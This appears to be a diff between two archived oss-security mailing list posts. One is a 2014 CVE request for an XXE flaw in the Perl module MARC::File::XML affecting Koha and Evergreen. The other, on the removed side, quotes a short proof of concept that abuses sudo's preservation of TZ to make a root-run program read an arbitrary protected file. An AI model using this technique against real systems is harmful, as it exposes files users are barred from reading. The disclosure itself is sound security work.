@@ -1,44 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/16/2
-Message-Id: <D4B77685-5992-4775-BC8F-3FB20083CA4A@omniti.com>
-Date: Wed, 15 Oct 2014 19:52:50 -0400
-From: Dan McDonald <danmcd@...iti.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: Re: Abusing TZ for fun (and little profit)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/21/5
+Message-ID: <CAPLnt67+7s+=DRaK2j+W+eduFFZ5U8tSPGuC7kfGQFpUqxw-RQ@mail.gmail.com>
+Date: Tue, 21 Jan 2014 10:59:53 -0800
+From: Galen Charlton <gmc@...library.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request: Perl module MARC::File::XML
 Content-Type: text/plain; charset=utf-8
 
-Libraries that use TZ (or any environment variable) should be careful.  For example...
+Hi,
 
-http://src.illumos.org/source/xref/illumos-gate/usr/src/lib/libc/port/gen/localtime.c#1417
+I am the maintainer of the Perl module MARC::File::XML, which is used
+by various applications to manipulate a metadata format used by
+libraries, and would like to request the allocation of a CVE
+identifier for an XXE vulnerability that is fixed in version 1.0.2 of
+the module.  I have evidence that the vulnerability can be used in at
+least one F/LOSS integrated library system, Koha, to perform an
+application-level privilege escalation, and another one, Evergreen, is
+likely vulnerable to disclosure of the contents of arbitrary files on
+the server.  I am a committer to both of those projects.
 
-Thanks for the reality check.  Glad we passed.
+Fix: http://sourceforge.net/p/marcpm/code/ci/cf2d36597a56eeeffd53b38182b8557c7bf569ac/
 
-Dan
+ChangeLog: https://metacpan.org/changes/distribution/MARC-XML
 
-Sent from my iPhone (typos, autocorrect, and all)
+Announcements:
 
-> On Oct 15, 2014, at 6:35 PM, Jakub Wilk <jwilk@...lk.net> wrote:
-> 
-> By default, sudo preserves the TZ variable[1] from user's environment. This is a bad idea on glibc systems, where TZ can be abused to trick the program to read an arbitrary file. PoC:
-> 
-> $ echo moo > tz
-> $ chmod 0 tz
-> $ cat tz
-> cat: tz: Permission denied
-> $ TZ=$PWD/tz sudo -u root strace -e read date
-> read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0"..., 512) = 512
-> read(3, "moo\n", 4096)                  = 4
-> read(3, "", 4096)                       = 0
-> Wed Oct 15 20:42:42  2014
-> +++ exited with 0 +++
-> 
-> 
-> Procmail is another program that recklessly whitelists TZ[2].
-> 
-> 
-> [1] https://sources.debian.net/src/sudo/1.8.5p2-1%2Bnmu1/plugins/sudoers/env.c/?hl=198#L189
-> [2] https://sources.debian.net/src/procmail/3.22-20%2Bdeb7u1/config.h/?hl=22#L13
-> 
-> -- 
-> Jakub Wilk
+http://www.nntp.perl.org/group/perl.perl4lib/2014/01/msg3073.html
+http://lists.katipo.co.nz/pipermail/koha/2014-January/038430.html
+http://libmail.georgialibraries.org/pipermail/open-ils-general/2014-January/009442.html
 
+Thanks,
+
+Galen
+-- 
+Galen Charlton
+Manager of Implementation
+Equinox Software, Inc. / The Open Source Experts
+email:  gmc@...library.com
+direct: +1 770-709-5581
+cell:   +1 404-984-4366
+skype:  gmcharlt
+web:    http://www.esilibrary.com/
+Supporting Koha and Evergreen: http://koha-community.org &
+http://evergreen-ils.org
